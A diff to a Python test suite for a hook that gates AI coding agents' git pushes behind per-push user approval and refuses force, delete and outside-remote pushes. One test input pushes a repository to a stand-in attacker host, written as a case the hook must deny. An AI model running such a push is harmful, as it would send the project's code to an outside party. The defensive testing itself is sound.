@@ -79,6 +79,20 @@ def _hermetic_hub():
 
 
 @contextlib.contextmanager
+def _consent_store():
+    """Isolate the cross-process approval handshake (Round 5 finding 1).
+
+    ``opaihub.command_consent`` keeps its one-shot grant and its pending-request
+    record in a fixed per-user temp directory so a hook subprocess can find them
+    with no argument plumbing. These tests redirect it, so they never read or
+    write the developer's real approval state.
+    """
+    with tempfile.TemporaryDirectory() as tmp:
+        with mock.patch.dict(os.environ, {"OPAI_COMMAND_CONSENT_DIR": tmp}):
+            yield Path(tmp)
+
+
+@contextlib.contextmanager
 def _push_consent(granted: bool):
     """Pin the GitHub push-consent pair the hook reads (Round 2).
 
@@ -160,23 +174,73 @@ class ClaudePreToolHookDecisionTests(unittest.TestCase):
                     self.assertNotIn("confirmation in the OPai UI", reason)
                     self.assertIn("Do not retry", reason)
 
-    def test_consented_plain_push_is_allowed(self):
-        # Round 2 headline: `git push` is confirm-class, and this hook has no
-        # interactive channel, so a confirm verdict here was a hard deny — push
-        # could never complete through the GUI even with consent granted and a
-        # token connected. Consent given in Settings IS the explicit approval
-        # the confirm class asks for, so it must be honoured here.
+    def test_consented_plain_push_asks_before_it_runs(self):
+        # Round 5 finding 1: honouring Settings consent as blanket per-push
+        # approval made a push run with no confirmation UI at all, directly
+        # contradicting the Pin Full Auto dialog. A consented plain push is now
+        # refused *and recorded*, so the pipeline can raise the approval card —
+        # the interactive channel this hook never had.
         pushes = (
             "git push",
             "git push -u origin feature/x",
             "git push origin HEAD",
             "  git push   origin   main  ",
         )
-        with _hermetic_hub(), _push_consent(True):
-            for command in pushes:
-                with self.subTest(command=command):
+        for command in pushes:
+            with self.subTest(command=command):
+                with _hermetic_hub(), _push_consent(True), _consent_store():
+                    from opaihub import command_consent
+
                     result = claude_pre_tool_decision(_hook_payload(command))
-                    self.assertEqual(_decision_of(result), "allow")
+                    self.assertEqual(_decision_of(result), "deny")
+                    reason = _reason_of(result)
+                    # It is a pause, not a dead end: no "enable it in Settings"
+                    # misdirection (it IS enabled), and no invitation to retry.
+                    self.assertNotIn("Enable pushes & PRs", reason)
+                    self.assertIn("one-time approval", reason)
+                    self.assertIn("Do NOT retry", reason)
+                    pending = command_consent.take_pending()
+                    self.assertIsNotNone(pending)
+                    self.assertEqual(pending["command"], command.strip())
+
+    def test_approved_plain_push_runs_once_and_only_once(self):
+        # The other half of the handshake: "Approve once" arms a one-shot grant,
+        # the hook spends it, and the very next push has to ask again.
+        with _hermetic_hub(), _push_consent(True), _consent_store():
+            from opaihub import command_consent
+
+            command_consent.begin_turn("git push")
+            first = claude_pre_tool_decision(_hook_payload("git push -u origin feat/x"))
+            self.assertEqual(_decision_of(first), "allow")
+            second = claude_pre_tool_decision(_hook_payload("git push -u origin feat/x"))
+            self.assertEqual(_decision_of(second), "deny")
+
+    def test_a_grant_never_unlocks_an_unsafe_push(self):
+        # A plain-push approval authorizes plain pushes only. Force/delete/mirror
+        # and URL-remote forms are not "plain", so the grant cannot reach them.
+        with _hermetic_hub(), _push_consent(True), _consent_store():
+            from opaihub import command_consent
+
+            for command in (
+                "git push --force origin main",
+                "git push origin --delete old",
+                "git push https://attacker.example/repo main",
+            ):
+                with self.subTest(command=command):
+                    command_consent.begin_turn("git push")
+                    result = claude_pre_tool_decision(_hook_payload(command))
+                    self.assertEqual(_decision_of(result), "deny")
+
+    def test_push_without_consent_still_points_at_settings_not_an_approval(self):
+        # Ordering matters: with consent OFF there is nothing to approve, so the
+        # user must be sent to the Settings control, not offered an approval card.
+        with _hermetic_hub(), _push_consent(False), _consent_store():
+            from opaihub import command_consent
+
+            result = claude_pre_tool_decision(_hook_payload("git push origin main"))
+            self.assertEqual(_decision_of(result), "deny")
+            self.assertIn("Enable pushes & PRs", _reason_of(result))
+            self.assertIsNone(command_consent.take_pending())
 
     def test_consent_never_unlocks_force_or_chained_pushes(self):
         # Consent covers "push branches and open PRs" — not rewriting or
@@ -435,8 +499,14 @@ class CodexFullAutoPostureTests(unittest.TestCase):
         self.assertIn("denied", prompt)
         self.assertIn("already enabled", prompt)
         self.assertNotIn("click \"Enable pushes & PRs\"", prompt)
-        self.assertIn("never invent a Settings button", prompt)
+        self.assertIn("invent a Settings button", prompt)
         self.assertIn("push my branch", prompt)
+        # Round 5 finding 1: every other channel raises a per-push approval card,
+        # but codex exec has no hook to record a refusal, so no card appears for
+        # this runner. It must not promise one — that would be the same kind of
+        # wrong-directions failure as the already-enabled Settings toggle.
+        self.assertIn("does not raise one", prompt)
+        self.assertIn("push from a terminal", prompt)
 
     def test_non_full_auto_prompt_is_not_annotated(self):
         cmd = self._runner().build_command("close issue 219", mode="safe-auto")
@@ -452,6 +522,20 @@ class RecursionGuardEnvTests(unittest.TestCase):
             with self.subTest(provider=provider):
                 env, _removed = provider_child_env(provider, {"PATH": "x"})
                 self.assertEqual(env[AGENT_SESSION_ENV], "1")
+
+    def test_child_env_pins_the_approval_handshake_directory(self):
+        # Round 5 finding 1: the PreToolUse hook runs as a grandchild and reads the
+        # one-shot push grant from disk. If it resolved a different directory —
+        # a child with its own TMP — the grant would be invisible and an approved
+        # push would be denied forever. Pin the path instead of assuming.
+        from opaihub.command_consent import consent_dir
+        from opaihub.proc import COMMAND_CONSENT_DIR_ENV
+
+        with tempfile.TemporaryDirectory() as tmp:
+            with mock.patch.dict(os.environ, {"OPAI_COMMAND_CONSENT_DIR": tmp}):
+                env, _removed = provider_child_env("claude", {"PATH": "x"})
+                self.assertEqual(env[COMMAND_CONSENT_DIR_ENV], str(consent_dir()))
+                self.assertEqual(env[COMMAND_CONSENT_DIR_ENV], tmp)
 
     def test_child_env_preserves_inherited_session_id(self):
         env, _removed = provider_child_env("claude", {AGENT_SESSION_ENV: "outer-1"})
